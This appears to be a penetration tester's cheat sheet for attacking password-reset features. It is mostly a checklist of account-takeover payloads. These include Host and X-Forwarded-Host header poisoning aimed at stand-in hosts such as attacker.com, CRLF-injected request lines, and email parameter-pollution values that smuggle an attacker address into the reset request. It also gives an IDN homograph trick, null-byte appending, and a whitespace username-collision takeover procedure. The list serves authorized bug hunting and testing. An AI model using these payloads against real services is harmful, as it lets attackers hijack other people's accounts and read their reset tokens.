## Check these on password Reset functionalities
1. When entering username in forgot password, use username + collaborator.com
	eg- ritik@collaborator.net

2. Intercept the request and change Host to:
	
```
Host: target.com
Host: target.com.collab.com
Host: target.com@collab.com
Host: collab.com#target.com
```

3. Change Host to:

	`Host: collab.com`
	
4.  Add Host:

	`X-Forwarded-Host: collab.com`

5. Check how it responds to an incorrect answer.
6. Use your own token with victim's account.
7. Use an expired token.
9. Click "Reset Password", Intercept request, Do parameter pollution of E-mail or Phone No.
10. Check response for Token leak
11. Change victim ID to the request, if successfull try to enumerate User ID.
12. equest URI manipulation
```
POST https://attacker.com/forgot-password HTTP/1.1
POST @attacker.com/forgot-password HTTP/1.1
POST :@attacker.com/forgot-password HTTP/1.1
POST /forgot-password@attacker.com HTTP/1.1
```
![[Req_URI_manipulate.png]]
![[Request_URI_manipulate_result.png]]
13. IDN homograph attack
	Use "https://github.com/UndeadSec/EvilURL" to change domains to unicode characters.
	`python3 evilurl.py -d https://gmail.com -g`
	Steps to reproduce:
	1. Create a new account with tuhin1729@gmail.com.xyz.burpcollaborator.net
	2. Go to password reset page and enter this email:
	tuhin1729@gmаil.com.xyz.burpcollaborator.net [Here "a" is different]
	If it's vulnerable then you'll get the password reset link to your collaborator
	server.
14. Append a json after the endpoint 
	![[Pass_reset__append_json.png]]
15. Weak encryptin using sequencer 
16. CRF Injection in URI. 
	1. `POST /resetpassword?%0d%0aHost:%20attacker.com HTTP/1.1`
	2. Password link is sent with attacker.com as host
17.  Leaking Password Reset Token
	1.  Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com 
	2.  Inspect the server response and check for `resetToken`  
	3.  Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`


### Post data manipulation
   1. `email=victim@email.com&email=attacker@email.com`  //Use of '&' symbol
   2. `email=victim@email.com%20email=attacker@email.com` //Use of '%20' 
   3. `email=victim@email.com%2|email=attacker@email.com` //Use of '|' 
   4. `email="victim@email.com%0a%0dcc:email=attacker@email.com"` //CRLF and CC
   5. `email="victim@email.com%0a%0dcc:email=attacker@email.com"` //CRLF and BCC
   6. `email="victim@email.com",email="attacker@email.com"`
   7.  `{"email":["victim@mail.tld","attacker@mail.tld"]}`//Attacker email as second parameter in JSON
   8. `{"email":"victim@email.com","email":"attacker@email.com"}`
   9. `email=victim@email.com,attacker.com`
   10. `email[]=victim@email.com&email[]=attacker@email.com`
   
## On Forgot Password
1. Intercept and find parameters using arjun. (Can be used to bypass OTP verification)
	1. Use previously known parameters. (Maybe from any password reset email) ![[Password_reset_parameter_manipulation.png]]
2. Check the parameters used and try HPP. Use parameter id.
3. User enumeration
4. IDOR
5. OTP Brute-Force
6. Parameter Pollution
7. Security Question bypass during password reset
	1. Direct Request
	2. Referrer check bypass
8. Guessable password reset token
9. No Expiration on password Reset Token
10. Password reset poisoning via Host-Header injection
11. Reusable password reset token
12. Missing rate limiting
13. SQL injection 
14. XSS
# Open Redirect 
Check for these parameters, if not present try to put and use them 
`returnUrl, goto, return_url, returnUri, cancelUrl, back, returnTo`
# More
1. Session token not expiring after password reset
2. Register with same name as victim but with a space after username
	1. Victim- "user23"
	2. Attacker - "user23 "
3. [[DoS]]
4. Append Null bytes "%00, %0d%0a, %0d, %0a, %09, %0C, %20" after email
5. Rate limit
6. ATO via [[HTTP Request smuggling]]
	1. https://salmonsec.com/cheatsheet/account_takeover#account-takeover-via-http-request-smuggling

### Password Reset Via Username Collision

1.  Register on the system with a username identical to the victim’s username, but with white spaces inserted before and/or after the username. e.g: `"admin "`    
2.  Request a password reset with your malicious username.     
3.  Use the token sent to your email and reset the victim password.  
4.  Connect to the victim account with the new password.
	`1.  The platform CTFd was vulnerable to this attack.`  
	`2.  See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)`